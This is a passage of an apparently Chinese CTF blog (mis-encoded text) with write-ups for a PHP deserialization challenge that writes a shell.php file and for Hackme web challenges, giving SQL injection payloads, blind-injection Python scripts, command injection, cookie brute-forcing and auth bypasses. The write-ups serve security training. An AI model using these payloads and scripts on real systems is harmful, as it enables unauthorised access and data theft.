&lt;span class="image main"&gt;&lt;img src="%s" alt="" /&gt;&lt;/span&gt; &lt;p&gt;%s&lt;/p&gt;&lt;button type="button" onclick=location.href="/download/%s"&gt;ä¸‹è½½&lt;/button&gt;&lt;/article&gt;&lt;/div&gt;&lt;footer id="footer"&gt;&lt;/footer&gt;&lt;/div&gt;&lt;script src="/static/js/jquery.min.js"&gt;&lt;/script&gt;&lt;script src="/static/js/browser.min.js"&gt;&lt;/script&gt;&lt;script src="/static/js/breakpoints.min.js"&gt;&lt;/script&gt;&lt;script src="/static/js/util.js"&gt;&lt;/script&gt;&lt;script src="/static/js/main.js"&gt;&lt;/script&gt;&lt;script src="/static/js/angular.js"&gt;&lt;/script&gt;   &lt;/body&gt;&lt;/html&gt;'</span>,substr(<span class="keyword">$this</span>-&gt;data[<span class="string">'name'</span>],<span class="number">0</span>,<span class="number">62</span>),<span class="keyword">$this</span>-&gt;data[<span class="string">'image'</span>],<span class="keyword">$this</span>-&gt;data[<span class="string">'message'</span>],session_id().<span class="string">'.jpg'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(file_put_contents(<span class="keyword">$this</span>-&gt;path,<span class="keyword">$this</span>-&gt;html))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="keyword">$this</span>-&gt;path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æœ¬æ„çœ‹èµ·æ¥åƒæ˜¯æŠŠä¸Šä¼ æ–‡ä»¶çš„ç¼“å­˜æ”¾åˆ°coreç›®å½•ä¸‹</p>
<p>ç›´æ¥é€šè¿‡ååºåˆ—åŒ–æ§åˆ¶dataæ•°æ®</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cache</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $data;</span><br><span class="line">    <span class="keyword">public</span> $sj;</span><br><span class="line">    <span class="keyword">public</span> $path;</span><br><span class="line">    <span class="keyword">public</span> $html;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">'name'</span>]=<span class="string">'1'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">'message'</span>]=<span class="string">'&lt;?php phpinfo();?&gt;'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">'image'</span>]=<span class="string">'1'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;path=<span class="string">"/var/www/html/shell.php"</span>    &#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(file_put_contents(<span class="keyword">$this</span>-&gt;path,<span class="keyword">$this</span>-&gt;html))&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="keyword">$this</span>-&gt;path);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"xx"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span> <span class="attr">value</span>=<span class="string">"123"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>å°†ååºåˆ—åŒ–æ•°æ®ä¸Šä¼ ä¸Šå»</p>
<p>æœ€ç»ˆæ‹¿åˆ°shellã€‚</p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/10/27/BalsnCTF2019-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E5%A4%8D%E7%8E%B0/" data-id="ckabsu37s000ckkvr5x8v1n7l" class="article-share-link" data-share="baidu" data-title="BalsnCTF2019+å·…å³°æå®¢å¤ç°">Share</a>
      

      
        <a href="http://yoursite.com/2019/10/27/BalsnCTF2019-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E5%A4%8D%E7%8E%B0/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Hackme-web" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/10/27/Hackme-web/" class="article-date">
  <time datetime="2019-10-27T08:41:49.000Z" itemprop="datePublished">2019-10-27</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/10/27/Hackme-web/">Hackme-web</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="Guestbook"><a href="#Guestbook" class="headerlink" title="Guestbook"></a>Guestbook</h3><p>æ³¨å…¥ç‚¹æŒºå¤š</p>
<p>insertæ ‡é¢˜å¤„å­˜åœ¨æ³¨å…¥</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and sleep(3) and &#39;</span><br></pre></td></tr></table></figure>

<p>å³å¯éªŒè¯æˆåŠŸ</p>
<p>idåœ°æ–¹ä¹Ÿå¯ä»¥æ³¨å…¥</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;-1 union select 1,2,3,(select group_concat(flag) from flag) --</span><br></pre></td></tr></table></figure>

<p>æ€è€ƒäº†ä¸€ä¸‹å¦‚ä½•æœ€å¿«çš„é€šè¿‡æ³¨å…¥æ‹¿åˆ°æ•°æ®çš„æ–¹æ³•ï¼Œæ—¶é—´ç›²æ³¨é‚£è‚¯å®šæ˜¯æœ€æ…¢çš„ï¼Œè¿˜å—ç½‘ç»œå½±å“â€¦,ä¸åˆ°æœ€åè¿˜æ˜¯åˆ«æ—¶é—´ç›²æ³¨äº†å§</p>
<h3 id="Ping"><a href="#Ping" class="headerlink" title="Ping"></a>Ping</h3><p>æ²¡è¿‡æ»¤æ‰å±é™©çš„åå¼•å·</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#96;nl f*&#96;&#x2F;&#x2F;é€šè¿‡sortä¹Ÿå¯ä»¥</span><br></pre></td></tr></table></figure>

<h3 id="Scoreboard"><a href="#Scoreboard" class="headerlink" title="Scoreboard"></a>Scoreboard</h3><p>ä¸¥é‡åæ§½scoreboardå’Œhomepageä¸¤ä¸ªé¢˜â€¦..ç´¯ä¸ç´¯å•Š..</p>
<h3 id="login-as-admin-0"><a href="#login-as-admin-0" class="headerlink" title="login as admin 0"></a>login as admin 0</h3><p>æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_filter</span><span class="params">($str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $strl = strtolower($str);</span><br><span class="line">    <span class="keyword">if</span> (strstr($strl, <span class="string">'or 1=1'</span>) || strstr($strl, <span class="string">'drop'</span>) ||</span><br><span class="line">        strstr($strl, <span class="string">'update'</span>) || strstr($strl, <span class="string">'delete'</span>)</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">"'"</span>, <span class="string">"\\'"</span>, $str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_POST = array_map(safe_filter, $_POST);</span><br><span class="line"></span><br><span class="line">$user = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// connect to database</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">'name'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    $connection_string = sprintf(<span class="string">'mysql:host=%s;dbname=%s;charset=utf8mb4'</span>, DB_HOST, DB_NAME);</span><br><span class="line">    $db = <span class="keyword">new</span> PDO($connection_string, DB_USER, DB_PASS);</span><br><span class="line">    $sql = sprintf(<span class="string">"SELECT * FROM `user` WHERE `user` = '%s' AND `password` = '%s'"</span>,</span><br><span class="line">        $_POST[<span class="string">'name'</span>],</span><br><span class="line">        $_POST[<span class="string">'password'</span>]</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $query = $db-&gt;query($sql);</span><br><span class="line">        <span class="keyword">if</span>($query) &#123;</span><br><span class="line">            $user = $query-&gt;fetchObject();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $user = <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">        $user = <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç®—æ˜¯ä¸ªè„‘ç­‹æ€¥è½¬å¼¯å§ï¼Œå¼€å§‹é€šè¿‡payloadè¿›å»äº†ï¼Œå‘ç°æ˜¯guestï¼Œé‚£å¯èƒ½adminåœ¨idä¸º2çš„é‚£æ¡</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:admin\&#39; or is_admin&#x3D;1#</span><br><span class="line"> &#x2F;&#x2F; admin\&#39; or id&#x3D;2#</span><br></pre></td></tr></table></figure>

<h3 id="login-as-admin-0-1"><a href="#login-as-admin-0-1" class="headerlink" title="login as admin 0.1"></a>login as admin 0.1</h3><p>å¯ä»¥å †å åŠ ç›²æ³¨</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line">url=<span class="string">"https://hackme.inndy.tw/login0/"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">32</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">		data=&#123;</span><br><span class="line">	<span class="string">'name'</span>:<span class="string">"admin\';select if(&#123;&#125;=ascii(mid((version()),&#123;&#125;,1)),sleep(3),1);"</span>.format(j,i),</span><br><span class="line">	<span class="string">'password'</span>:<span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			r=requests.post(url,data=data,timeout=<span class="number">2.8</span>)</span><br><span class="line">		<span class="keyword">except</span>:</span><br><span class="line">			flag+=chr(j)</span><br><span class="line">			<span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>

<p>ç„¶è€Œæ›´å¥½åšæ³•æ˜¯unionâ€¦</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin\&#39; union select 1,(select the_f14g from h1dden_f14g limit 0,1),3,4#</span><br></pre></td></tr></table></figure>

<p>ä»¥ååšé¢˜è¿˜æ˜¯å…ˆè¯•è¯•unionæˆ–è€…æŠ¥é”™æ³¨å…¥ï¼Œæ¯•ç«Ÿæ—¶é—´ç›²æ³¨æ˜¯æœ€ä½æ•ˆçš„æ“ä½œã€‚</p>
<h3 id="login-as-admin-1"><a href="#login-as-admin-1" class="headerlink" title="login as admin 1"></a>login as admin 1</h3><p>å˜äº†ä¸€ä¸‹è¿‡æ»¤ï¼Œæ²¡ä»€ä¹ˆå¤ªå¤§ç”¨</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_filter</span><span class="params">($str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $strl = strtolower($str);</span><br><span class="line">    <span class="keyword">if</span> (strstr($strl, <span class="string">' '</span>) || strstr($strl, <span class="string">'1=1'</span>) || strstr($strl, <span class="string">"''"</span>) ||</span><br><span class="line">        strstr($strl, <span class="string">'union select'</span>) || strstr($strl, <span class="string">'select '</span>)</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">"'"</span>, <span class="string">"\\'"</span>, $str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ²¡å•¥åŒºåˆ«â€¦</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin\&#39;&#x2F;**&#x2F;or&#x2F;**&#x2F;id&#x3D;2#</span><br></pre></td></tr></table></figure>

<h3 id="login-as-admin-1-2"><a href="#login-as-admin-1-2" class="headerlink" title="login as admin 1.2"></a>login as admin 1.2</h3><p>è¿™ä¸ªé—®é¢˜ï¼Œä¸Šæ¬¡ç›²æ³¨è„šæœ¬å°±èƒ½è§£å†³ï¼Œç©ºæ ¼æ¢ä¸€ä¸‹å°±è¡Œ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">flag&#x3D;&#39;&#39;</span><br><span class="line">url&#x3D;&quot;https:&#x2F;&#x2F;hackme.inndy.tw&#x2F;login0&#x2F;&quot;</span><br><span class="line">for i in range(1,32):</span><br><span class="line">	for j in range(33,127):</span><br><span class="line">		data&#x3D;&#123;</span><br><span class="line">	&#39;name&#39;:&quot;admin\&#39;;select&#x2F;**&#x2F;if(&#123;&#125;&#x3D;ascii(mid((version()),&#123;&#125;,1)),sleep(3),1);&quot;.format(j,i),</span><br><span class="line">	&#39;password&#39;:1</span><br><span class="line">&#125;</span><br><span class="line">		try:</span><br><span class="line">			r&#x3D;requests.post(url,data&#x3D;data,timeout&#x3D;2.8)</span><br><span class="line">		except:</span><br><span class="line">			flag+&#x3D;chr(j)</span><br><span class="line">			print flag</span><br></pre></td></tr></table></figure>

<h3 id="Login-as-Admin-3"><a href="#Login-as-Admin-3" class="headerlink" title="Login as Admin 3"></a>Login as Admin 3</h3><p>æœ€å¼€å§‹æœ‰ç‚¹æƒ³åäº†â€¦è¿˜æƒ³ä»jsonä¸­æ³¨å…¥æ–°çš„adminå­—æ®µâ€¦çœŸæ˜¯å¤©çœŸï¼Œåæ¥å‘ç°hmacæœ‰å¼±ç±»å‹æ¯”è¾ƒï¼Œçˆ†ç ´ä¸€ä¸‹cookieä¸­çš„å€¼å°±è¡Œäº†ï¼Œå‘ç°9çš„æ—¶å€™æ­£å¥½å¯ä»¥ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url=<span class="string">"https://hackme.inndy.tw/login3/"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">	data=<span class="string">'&#123;"sig":0,"data":"[\\"guest\\",'</span>+chr(i)+<span class="string">']"&#125;'</span></span><br><span class="line">	<span class="keyword">print</span> data</span><br><span class="line">	payload=base64.b64encode(data)</span><br><span class="line">	cookies=&#123;</span><br><span class="line">	<span class="string">'user'</span>:payload</span><br><span class="line">	&#125;</span><br><span class="line">	r=requests.get(url,cookies=cookies)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">"You are admin"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">		<span class="keyword">print</span> r.text</span><br><span class="line"></span><br><span class="line"><span class="comment">###</span></span><br></pre></td></tr></table></figure>

<h3 id="Login-as-Admin4"><a href="#Login-as-Admin4" class="headerlink" title="Login as Admin4"></a>Login as Admin4</h3><p>åº”è¯¥ç®—ä¸ªé€»è¾‘æ¼æ´</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'name'</span>] === <span class="string">'admin'</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>($_POST[<span class="string">'password'</span>] !== $password) &#123;</span><br><span class="line">        <span class="comment">// show failed message if you input wrong password</span></span><br><span class="line">        header(<span class="string">'Location: ./?failed=1'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬çŸ¥é“åœ¨locationåå¦‚æœä¸åŠ exit()é‚£ä¹ˆä¼šæ‰§è¡Œheaderä¸‹é¢çš„ä»£ç </p>
<p>æˆ‘ä»¬åœ¨ç”¨curlçš„æ—¶å€™ä¸åŠ -Læ˜¯ä¸ä¼šè·Ÿéšè·³è½¬çš„ï¼Œæ‰€ä»¥å¦‚æœæ¥ç€æ‰§è¡Œä¸‹é¢çš„ä»£ç çš„è¯ï¼Œç›´æ¥ä¼šbypasséªŒè¯ï¼Œæ‹¿åˆ°flagï¼Œæ‰€ä»¥headeråä¸€å®šè¦åŠ ä¸ªexit()å•Š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https:&#x2F;&#x2F;hackme.inndy.tw&#x2F;login4&#x2F; -d &quot;name&#x3D;admin&quot;</span><br></pre></td></tr></table></figure>

<h3 id="Login-as-Admin6"><a href="#Login-as-Admin6" class="headerlink" title="Login as Admin6"></a>Login as Admin6</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@error_reporting(E_ALL^E_NOTICE);</span><br><span class="line"><span class="keyword">require</span>(<span class="string">'config.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'show_source'</span>] === <span class="string">'1'</span>) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// connect to database</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">'data'</span>])) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $data = json_decode($_POST[<span class="string">'data'</span>], <span class="keyword">true</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">        $data = [];</span><br><span class="line">    &#125;</span><br><span class="line">    extract($data);</span><br><span class="line">    <span class="keyword">if</span>($users[$username] &amp;&amp; strcmp($users[$username], $password) == <span class="number">0</span>) &#123;</span><br><span class="line">        $user = $username;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Payloadå¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//&#123;"username":"admin","users":&#123;"admin":"lihuaiqiu"&#125;,"password":"lihuaiqiu"&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$payload[<span class="string">'username'</span>]=<span class="string">'admin'</span>;</span><br><span class="line"></span><br><span class="line">$payload[<span class="string">'users'</span>][<span class="string">'admin'</span>]=<span class="string">'lihuaiqiu'</span>;</span><br><span class="line"></span><br><span class="line">$payload[<span class="string">'password'</span>]=<span class="string">'lihuaiqiu'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> json_encode($payload);</span><br></pre></td></tr></table></figure>

<h3 id="Login-as-Admin7"><a href="#Login-as-Admin7" class="headerlink" title="Login as Admin7"></a>Login as Admin7</h3><p>å¼±ç±»å‹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=QNKCDZO</span><br></pre></td></tr></table></figure>

<h3 id="dafuq-manager-1"><a href="#dafuq-manager-1" class="headerlink" title="dafuq-manager 1"></a>dafuq-manager 1</h3><p>è¿™ä¸ªç³»åˆ—çš„é¶åœºæˆ‘è§‰å¾—æŒºæœ‰æ„æ€çš„ï¼Œæœ‰ç§å°å°å‹cmsçš„æ„Ÿè§‰å§ï¼Œä¹Ÿå­¦åˆ°äº†ä¸€äº›æœ‰è¶£çš„çŸ¥è¯†</p>
<p>ç¬¬ä¸€å…³éœ€è¦ç™»é™†guestæ‰¾åˆ°flag</p>
<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°cookieé‡Œæœ‰ä¸€äº›æœ‰è¶£çš„ä¸œè¥¿ï¼Œå°†cookieä¸­çš„show_hiddenæ”¹ä¸ºyesæ‹¿åˆ°flag</p>
<h3 id="dafuq-manager-2"><a href="#dafuq-manager-2" class="headerlink" title="dafuq-manager 2"></a>dafuq-manager 2</h3><p>é¢˜ç›®è¦æ±‚ä»¥adminç™»é™†æ‰å¯ä»¥æ‹¿åˆ°flag,å¹¶ä¸”ç»™äº†æºç ï¼ŒæŠŠæºç ä¸‹è½½ä¸‹æ¥å¼€å§‹å®¡è®¡</p>
<p>å¯ä»¥çœ‹åˆ°å…¥å£æ˜¯ä¸€ä¸ªswitchï¼ˆè¯è¯´è¿™ä»£ç å†™çš„çœ‹çš„äººæ˜¯çœŸçš„éš¾å—â€¦</p>
<p><strong>index.phpä¸­è·Ÿè¿›case â€œadminâ€</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">"admin"</span>:</span><br><span class="line">    <span class="keyword">require</span> <span class="string">"./core/fun_admin.php"</span>;</span><br><span class="line">    show_admin($GLOBALS[<span class="string">"dir"</span>]);</span><br></pre></td></tr></table></figure>

<p><strong>fun_admin.phpä¸­è·Ÿè¿›show_admin</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_admin</span><span class="params">($dir)</span> </span>&#123;</span><br><span class="line">    $pwd = (($GLOBALS[<span class="string">"permissions"</span>] &amp; <span class="number">2</span>) == <span class="number">2</span>);</span><br><span class="line">    $admin = (($GLOBALS[<span class="string">"permissions"</span>] &amp; <span class="number">4</span>) == <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">if</span> (!$GLOBALS[<span class="string">"require_login"</span>]) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"miscnofunc"</span>]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($GLOBALS[<span class="string">'__GET'</span>][<span class="string">"action2"</span>])) $action2 = $GLOBALS[<span class="string">'__GET'</span>][<span class="string">"action2"</span>];</span><br><span class="line">    <span class="keyword">elseif</span> (<span class="keyword">isset</span>($GLOBALS[<span class="string">'__POST'</span>][<span class="string">"action2"</span>])) $action2 = $GLOBALS[<span class="string">'__POST'</span>][<span class="string">"action2"</span>];</span><br><span class="line">    <span class="keyword">else</span> $action2 = <span class="string">""</span>;</span><br><span class="line"><span class="comment">// adminæ‰€æ‹¥æœ‰çš„åŠŸèƒ½</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å½“$GLOBALS[â€œpermissionsâ€]å¤§äº4ï¼Œå³å¯æ»¡è¶³æ‰€æœ‰adminåŠŸèƒ½</p>
<p>å¯ä»¥çœ‹ä¸€ä¸‹å½“å‰ç”¨æˆ·çš„permissons</p>
<p><strong>è·Ÿè¿›fun_users.phpä¸­activate_user</strong></p>
<p>å‘ç°</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">activate_user</span><span class="params">($user, $pass)</span> </span>&#123;</span><br><span class="line">    $data = find_user($user, $pass);</span><br><span class="line">    <span class="keyword">if</span> ($data == <span class="keyword">NULL</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    ...</span><br><span class="line">    $GLOBALS[<span class="string">"permissions"</span>] = $data[<span class="number">6</span>];</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>è·Ÿè¿›find_user</strong></p>
